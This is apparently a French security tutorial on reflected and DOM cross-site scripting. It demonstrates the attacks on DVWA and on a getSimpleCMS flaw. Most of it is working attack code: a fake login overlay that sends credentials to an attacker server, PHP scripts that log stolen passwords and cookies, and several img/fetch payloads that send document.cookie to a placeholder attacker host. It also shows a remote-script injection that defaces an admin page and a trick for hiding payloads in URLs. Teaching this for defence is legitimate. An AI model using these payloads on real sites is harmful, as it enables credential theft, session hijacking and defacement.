# Injection XSS

**XSS signifie Cross Site Scripting**

Nous allons tester ensemble des failles de sécurité de type XSS reflected, nous verrons au travers de nos tests que certaines attaques peuvent être très avancées.

*Nous verrons un peu plus tard pour mettre en place une attaque de type phishing (nous profiterons pour voir l’envoi de mail “anonyme”) et la redirection de données en post pour une attaque XSS avancée, qui aboutira à un vol de session.*

Les impacts d’une faille de XSS peuvent être importants comme vous le verrez dans cette démonstration.

Dans notre premier essai nous avons utilisez DVWA pour appréhender l'injection XSS Reflected.

Voici une injection qui permet de créer une surcouche sur le site avec un formulaire ressemblant comme 2 gouttes d'eau à celui de base. PENSEZ A MODIFIER les "*************" par votre adresse http de l'attaquant.

```html
<div style="color: #6b6b6b;background-color:#fefffe;position:absolute;top:0;left:0;z-index:1000;width:100%;height:100%;"><link rel="stylesheet" type="text/css" href="/dvwa/css/login.css" /><div style="margin:auto;width:350px;"><div><br><p style="text-align:center;"><img src="/dvwa/images/login_logo.png"></p><br></div><form action="************" method="post"><fieldset><label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br><label for="pass">Password</label> <input type="password" class="loginInput" autocomplete="off" size="20" name="password"></fieldset><p style="text-align:center;font-size:14px" class="submit"><input type="submit" value="Login" name="Login"></p></form></div></div>
```


Voici un exemple de code permettant de récupérer les données de ce formulaire :

```php
<?php

if(sizeof($_POST) > 0) {
	if(!empty($_POST['username']) && is_string($_POST['username'])) {
		if(!empty($_POST['password']) && is_string($_POST['password'])) {
			file_put_contents('recup_login.txt', date('d/m/Y H:i:s').' - login: '.$_POST['username'].', password: '.$_POST['password']."\n", FILE_APPEND);
		}
	}
}
header('location:http://<SITE_VICTIME>/');

```

Ici l'attaque pourrait être soumise par mail l'url ressemblerait en partie à ça :

![Injection%20XSS/Untitled%201.png](Injection%20XSS/Untitled%201.png)

Cela pourrait intriguer un utilisateur avertie, cependant une technique simple pourrait donner une url comme celle ci :

![Injection%20XSS/Untitled%202.png](Injection%20XSS/Untitled%202.png)

Des mot clés rassurant tel que secure_id ou private_key qui sont ici uniquement dans le but de pousser l'injection dans la partie non visible de l'url dans la barre d'adresse.

**Vol de session**

Voici un exemple de code permettant de récupérer les cookies (recup_cookie.php) :

```php
<?php

if(sizeof($_GET) > 0) {
	if(!empty($_GET['cookie']) && is_string($_GET['cookie'])) {
		file_put_contents('recup_cookie.txt', date('d/m/Y H:i:s').' - '.$_GET['cookie']."\n", FILE_APPEND);
	}
}
header('location:http://<SITE_VICTIME>/');
```

Exemple avec un **document.location** :

`Michel<img src="404" style="display:none;" onerror="document.location='http://<SERVER_ATTAQUANT>/recup_cookie.php?cookie='+document.cookie;">`

Voici des exemples d'attaques avec fetch pour les navigateurs récents

`<script>fetch('http://<SERVER_ATTAQUANT>/recup_cookie.php?cookie='+document.cookie);</script>`

Voici une façon une plus discrète :

`Michel<img src="404" style="display:none;" onerror="javascript:fetch('http://<SERVER_ATTAQUANT>/recup_cookie.php?cookie='+document.cookie);">`

ou

`Michel<img src="404" style="display:none;" onerror="fetch('http://<SERVER_ATTAQUANT>/recup_cookie.php?cookie='+document.cookie);">`

# **XSS DOM**

Il est possible de modifier dans certains cas du code javascript, pour exemple je vais vous montrer une découverte effectuée dans getSimpleCMS.

Dans le fichier header.php on peut remarquer qu'une variable GET n'est pas contrôlée :

![Untitled](Injection%20XSS/Untitled%203.png)

En créant une injection dans cette variable (via la chaine de requête :

![Untitled](Injection%20XSS/Untitled%204.png)

En créant une injection XSS DOM dans la variable path, il est possible d'exécuter du javascript :

![Untitled](Injection%20XSS/Untitled%205.png)

Il est bien sur possible de créer des injections bien plus puissante qu'un simple "Hello world".

Imaginez le chargement d'un script externe qui pourrait supprimer les différentes pages ou de créer n'importe quelle interaction avec l'interface avec les droits de l'administrateur.

Nous pourrions créer sur un fichier externe, par exemple sur [https://hastebin.com/](https://hastebin.com/)

```jsx
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('post-title').value = 'Hacked By Cyril';
    document.getElementById('post-content').textContent = 'Ce site a été DEFACED par Cyril';
    document.getElementById('page_submit').click();
});
```

**L'injection pourrait ressembler à ça :**

http://192.168.0.28/admin/edit.php?path=';</script><script src="https://hastebin.com/raw/XXXXXXXX">

Le code Javascript serait alors exécuté et il a pour objectif de modifier la page d'accueil.

[Protection XSS](https://www.notion.so/Protection-XSS-e786b084223f4e17b3faf5032b14a46d)